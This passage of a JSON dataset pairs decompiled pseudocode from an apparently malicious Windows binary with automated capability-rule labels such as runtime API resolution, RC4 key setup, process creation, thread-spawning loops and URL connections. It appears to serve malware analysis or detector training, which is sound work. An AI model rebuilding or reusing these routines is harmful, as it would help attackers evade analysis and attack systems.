var_80h._0_2_ = 0;\n    uVar2 = fcn.004059dc(0, 0, 0, 0x8000000, 0, 0, &fcn.00474f80::var_b0h, &fcn.00474f80::var_c0h);\n    sub.kernel32.dll_CreateProcessA(0, uVar2);\n    cVar1 = fcn.0040a26c();\n    if (cVar1 == '\\0') {\n        fcn.004055c8();\n    }\n    cVar1 = fcn.0040a26c();\n    if (cVar1 == '\\0') {\n        fcn.0040f234();\n    }\n    fcn.004055c8();\n    uStack68 = fcn.00474d58();\n    uStack64 = fcn.00474d58();\n    uStack60 = fcn.00474d58();\n    uStack56 = fcn.00474d58();\n    uStack52 = fcn.00474d58();\n    uStack48 = fcn.00474d58();\n    uStack44 = fcn.00474d58();\n    uStack40 = fcn.00474d58();\n    uStack28 = fcn.00474d58();\n    uStack36 = fcn.00474d58();\n    uStack32 = fcn.00474d58();\n    fcn.004059dc();\n    uStack20 = fcn.00474d58();\n    uStack24 = var_b8h;\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x4752fc);\n    var_6ch = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x475318);\n    uStack108 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x475280);\n    uStack100 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x475288);\n    uStack100 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x475294);\n    uStack96 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x4752a0);\n    uStack92 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x4752ac);\n    uStack88 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x4752bc);\n    uStack84 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x4752d0);\n    uStack80 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x4752dc);\n    uStack76 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47530c, 0x4752e8);\n    uStack72 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = 0;\n    fcn.00474e20(0, 0x60);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x47524d);\n    return;\n}\n",
        "token_count": 1296
    },
    "00475328": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475328(code **arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_54h;\n    uint var_44h;\n    \n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x10]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[3] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xf], arg_8h[0x11]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[2] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x15]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[5] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x16]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[6] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x12]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[4] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x13]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[7] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x14]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[0xd] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x18]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[0xb] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x1b]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[10] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x1a]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[0xc] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x19]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[8] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x1c]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[9] = pcVar2;\n    (*arg_8h[7])(0);\n    (*arg_8h[0xd])(0, 0, arg_8h[0x1e]);\n    iVar3 = (*arg_8h[4])();\n    if ((iVar3 == 0xb7) && (iVar3 = (*arg_8h[9])(1, 0, arg_8h[0x1f]),  iVar3 != 0)) {\n        (*arg_8h[0xc])(iVar3);\n        (*arg_8h[10])(iVar3);\n        (*arg_8h[0xb])(iVar3);\n        (*arg_8h[8])(0);\n    }\n    while( true ) {\n        (*arg_8h[7])(0);\n        uVar1 = (*arg_8h[0xd])(0, 0, arg_8h[0x17]);\n        iVar3 = (*arg_8h[4])();\n        if (iVar3 != 0xb7) break;\n        (*arg_8h[0xb])(uVar1);\n        (*arg_8h[3])(500);\n    }\n    (*arg_8h[0xb])(uVar1);\n    do {\n        while( true ) {\n            var_44h = 0x44;\n            iVar3 = (*arg_8h[5])(0, arg_8h[0x1d], 0, 0, 0, 0, 0, 0, &var_44h, &var_54h);\n            if (iVar3 != 0) break;\n            (*arg_8h[3])(2000);\n        }\n        iVar3 = 0;\n        do {\n            iVar4 = (*arg_8h[6])(var_54h, 200);\n            if (iVar4 == 0) {\n                iVar3 = -1;\n            }\n        } while (iVar3 == 0);\n    } while( true );\n}\n",
        "token_count": 1186
    },
    "004754c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004754c4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack252;\n    uint uStack248;\n    uchar *puStack244;\n    uint var_e0h;\n    uint var_d8h;\n    uint var_d0h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_8ch;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack244 = 0x4754e1;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack244 = 0x4754e9;\n    fcn.004059cc();\n    puStack244 = 0x4754f1;\n    fcn.004059cc();\n    uStack248 = 0x475829;\n    uStack252 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff04;\n    puStack244 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_d0h = 0x44;\n    var_a4h = 1;\n    var_a0h._0_2_ = 0;\n    cVar1 = fcn.0040a26c();\n    if (cVar1 == '\\0') {\n        fcn.004055c8();\n    }\n    cVar1 = fcn.0040a26c();\n    if (cVar1 == '\\0') {\n        fcn.0040f234();\n    }\n    uVar2 = fcn.004059dc(0, 0, 0, 0x8000000, 0, 0, &fcn.004754c4::var_d0h, &fcn.004754c4::var_e0h);\n    sub.kernel32.dll_CreateProcessA(0, uVar2);\n    uStack88 = fcn.00474d58();\n    uStack84 = fcn.00474d58();\n    uStack80 = fcn.00474d58();\n    uStack76 = fcn.00474d58();\n    uStack60 = fcn.00474d58();\n    uStack72 = fcn.00474d58();\n    uStack68 = fcn.00474d58();\n    uStack64 = fcn.00474d58();\n    uStack48 = fcn.00474d58();\n    uStack44 = fcn.00474d58();\n    uStack32 = fcn.00474d58();\n    uStack24 = fcn.00474d58();\n    uStack36 = fcn.00474d58();\n    uStack40 = fcn.00474d58();\n    fcn.004059dc();\n    uStack52 = fcn.00474d58();\n    uStack56 = fcn.00474d58();\n    fcn.004059dc();\n    uStack28 = fcn.00474d58();\n    uStack20 = var_d8h;\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x475924);\n    var_8ch = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x475940);\n    uStack140 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x475870);\n    uStack132 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475950, 0x475878);\n    uStack136 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x4758c4);\n    uStack100 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x475884);\n    uStack124 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x475894);\n    uStack128 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x4758a4);\n    uStack116 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x4758b4);\n    uStack92 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x4758fc);\n    uStack96 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x4758d0);\n    uStack112 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x4758e8);\n    uStack104 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x475910);\n    uStack120 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475934, 0x4758dc);\n    uStack108 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = 0;\n    fcn.00474e20(0, 0x80);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x475830);\n    return;\n}\n",
        "token_count": 1551
    },
    "004800dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004800dc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack408;\n    uint uStack404;\n    uchar *puStack400;\n    uint uStack396;\n    uint uStack392;\n    uchar *puStack388;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_4h;\n    \n    puStack400 = &stack0xfffffffc;\n    puStack388 = 0x4800f3;\n    fcn.004059cc();\n    puStack388 = 0x480104;\n    fcn.00405fe8();\n    uStack392 = 0x4801d3;\n    uStack396 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe74;\n    uStack404 = 0x48018e;\n    uStack408 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe68;\n    puStack388 = &stack0xfffffffc;\n    fcn.0040a488();\n    fcn.0040a4fc();\n    *in_FS_OFFSET = uStack408;\n    *in_FS_OFFSET = uStack396;\n    puStack388 = 0x4801da;\n    uStack392 = 0x4801ca;\n    fcn.004060ac();\n    uStack392 = 0x4801d2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 329
    },
    "00480690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00480690(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x480743;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar2 = (**(**(in_EAX + 0x40) + 0x14))();\n    if ((0 < iVar2) && (iVar2 = (**(**(in_EAX + 0x40) + 0x14))(),  -1 < iVar2 + -1)) {\n        do {\n            (**(**(in_EAX + 0x40) + 0xc))();\n            cVar1 = fcn.0040a26c();\n            if (cVar1 != '\\0') {\n                fcn.004800dc();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x48074a;\n    uStack56 = 0x480742;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 334
    },
    "00480e44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00480e44(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_16ch;\n    uint var_168h;\n    uint var_154h;\n    uint var_4h;\n    \n    puStack396 = &stack0xfffffffc;\n    puStack384 = 0x480e65;\n    fcn.004059cc();\n    puStack384 = 0x480e76;\n    fcn.00405fe8();\n    uStack388 = 0x480f43;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    uStack400 = 0x480f00;\n    uStack404 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe6c;\n    puStack384 = &stack0xfffffffc;\n    fcn.00405864();\n    iVar1 = fcn.0040a488();\n    while (iVar1 == 0) {\n        uStack404 = 0x480f6c;\n        fcn.004058e0();\n        iVar1 = fcn.0040a4d8();\n    }\n    fcn.0040a4fc();\n    *in_FS_OFFSET = uStack404;\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x480f4a;\n    uStack388 = 0x480f29;\n    fcn.00405530();\n    uStack388 = 0x480f3a;\n    fcn.004060ac();\n    uStack388 = 0x480f42;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 403
    },
    "004810d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid fcn.004810d4(void)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    uint uVar3;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar auStack20 [2];\n    uchar *var_eh;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x10 = &stack0xfffffffc;\n    iVar1 = 0xb;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    _auStack20 = 0x481283;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_14h;\n    fVar2 = fcn.0040bcf8();\n    var_1ch = SUB84(fVar2, 0);\n    var_18h = fVar2 >> 0x20;\n    fcn.0040b900(&var_8h, var_1ch, var_18h);\n    fVar2 = fcn.0040bcf8();\n    var_28h = SUB84(fVar2, 0);\n    var_24h = fVar2 >> 0x20;\n    fcn.0040bbe0(var_28h, var_24h);\n    fcn.004735e8();\n    arg_8h = var_14h;\n    fcn.004735e8();\n    fcn.004735e8(var_18h);\n    fcn.004735e8(var_1ch);\n    fcn.00473448(arg_8h);\n    fcn.004735e8();\n    fcn.0048ce74(var_28h);\n    fcn.00409d70(arg_8h);\n    fcn.00409d70(0x4812e8, var_28h);\n    fcn.00409d70(0x4812e8, arg_8h);\n    fcn.00409d70(0x4812f4, var_28h);\n    fcn.00409d70(0x4812e8);\n    fcn.00409d70(arg_8h);\n    fcn.00409d70(0x4812e8);\n    fcn.00409d70(var_28h);\n    fcn.004058e0(0x481300, 0x4812f4);\n    fcn.0048adcc(var_24h);\n    uVar3 = 0x481310;\n    fcn.00480d08(0x481310, arg_8h);\n    fcn.004058e0(0x4812e8);\n    fcn.00473560();\n    fcn.00473540();\n    *in_FS_OFFSET = uVar3;\n    fcn.00405554(0x48128a);\n    return;\n}\n",
        "token_count": 1039
    },
    "00482320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00482320 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x482455;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405728();\n    fcn.00405b28(&var_1ch);\n    fcn.00405a44();\n    fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    _var_18h = fcn.0040b740();\n    if (_var_18h == *0x482470) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x482474;\n    do {\n        sub.kernel32.dll_Sleep_2(100);\n        sub.kernel32.dll_CreateThread_1();\n        _var_18h = _var_18h - *0x482478;\n    } while (*0x482470 < _var_18h);\n    fcn.0048ce74();\n    fcn.00405864();\n    fcn.00475e2c();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 420
    },
    "004827c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004827c4 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x4828f9;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405728();\n    fcn.00405b28(&var_1ch);\n    fcn.00405a44();\n    fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    _var_18h = fcn.0040b740();\n    if (_var_18h == *0x482914) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x482918;\n    do {\n        sub.kernel32.dll_Sleep_2(100);\n        sub.kernel32.dll_CreateThread_1();\n        _var_18h = _var_18h - *0x48291c;\n    } while (*0x482914 < _var_18h);\n    fcn.0048ce74();\n    fcn.00405864();\n    fcn.00475e2c();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 424
    },
    "00482c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00482c40(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x482c59;\n    fcn.004059cc();\n    uStack36 = 0x482cb2;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0xc);\n    fcn.00405584();\n    *(iVar1 + 4) = param_2;\n    *(iVar1 + 8) = var_8h;\n    uVar2 = 0;\n    sub.kernel32.dll_CreateThread_1(0, 0, fcn.00482b34, iVar1, 0, &fcn.00482c40::var_ch);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x482cb9);\n    return;\n}\n",
        "token_count": 279
    },
    "00482cdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00482cdc noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack48 = 0x482cfe;\n    fcn.00405fe8();\n    uStack52 = 0x482dfc;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x482db5;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.00408560();\n    fcn.004055c8();\n    uVar1 = fcn.004059dc();\n    var_14h = sub.wsock32.dll_inet_addr(uVar1);\n    iVar2 = sub.wsock32.dll_gethostbyaddr(&fcn.00482cdc::var_14h, 4, 2);\n    uVar3 = iVar2 == 0;\n    if (!uVar3) {\n        fcn.0040aaa8(0x482e14, var_4h, *0x49a390);\n        fcn.004058e0(0x482e20, 0);\n    }\n    fcn.00405974();\n    if (uVar3) {\n        *0x494788 = 0;\n        *0x494784 = 1;\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 441
    },
    "00483468": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create HTTP request",
            "connect to URL"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004835b5)\n\nvoid __cdecl fcn.00483468(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar3;\n    uint uVar4;\n    uint uStack1136;\n    uint uStack1132;\n    uchar *puStack1128;\n    uint uStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uint uStack1112;\n    uint uStack1108;\n    uint uStack1104;\n    uint uStack1100;\n    uchar *puStack1096;\n    uint uStack1092;\n    uint uStack1088;\n    uchar *puStack1084;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack1096 = &stack0xfffffffc;\n    puStack1084 = 0x4834a2;\n    fcn.00405fe8();\n    uStack1088 = 0x483630;\n    uStack1092 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbbc;\n    uStack1100 = 0x4835bf;\n    uStack1104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbb0;\n    uStack1108 = 0x4834cd;\n    puStack1084 = &stack0xfffffffc;\n    fcn.00408560();\n    uStack1108 = 0x4834d7;\n    fcn.004055c8();\n    arg_8h_00 = *(arg_8h + 4);\n    uStack1108 = 0x4834ff;\n    fcn.00403af4();\n    uStack1108 = 0;\n    uStack1112 = 0;\n    uStack1116 = 0;\n    uStack1120 = 0;\n    uStack1124 = 0x483640;\n    puStack1128 = 0x483511;\n    uVar1 = sub.wininet.dll_InternetOpenA();\n    uStack1132 = 0x4835a5;\n    uStack1136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffb90;\n    puStack1128 = &stack0xfffffffc;\n    uVar2 = fcn.004059dc(0, 0, 0, 0);\n    uVar2 = sub.wininet.dll_InternetOpenUrlA(uVar1, uVar2);\n    sub.wininet.dll_InternetCloseHandle();\n    *in_FS_OFFSET = uVar2;\n    sub.wininet.dll_InternetCloseHandle(uVar1, 0x4835ac);\n    uVar4 = 0x483654;\n    uVar3 = 0;\n    uVar2 = 0x483684;\n    uVar1 = 0;\n    fcn.00409e5c(arg_8h_00);\n    fcn.004058e0(0x483690, 0, arg_8h_00, uVar1, uVar2, uVar3, uVar4);\n    fcn.00475e2c();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 786
    },
    "00483858": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00483858 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x48398d;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405728();\n    fcn.00405b28(&var_1ch);\n    fcn.00405a44();\n    fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    _var_18h = fcn.0040b740();\n    if (_var_18h == *0x4839a8) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x4839ac;\n    do {\n        sub.kernel32.dll_Sleep_2(100);\n        sub.kernel32.dll_CreateThread_1();\n        _var_18h = _var_18h - *0x4839b0;\n    } while (*0x4839a8 < _var_18h);\n    fcn.0048ce74();\n    fcn.00405864();\n    fcn.00475e2c();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 428
    },
    "00484048": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "open process"
        ],
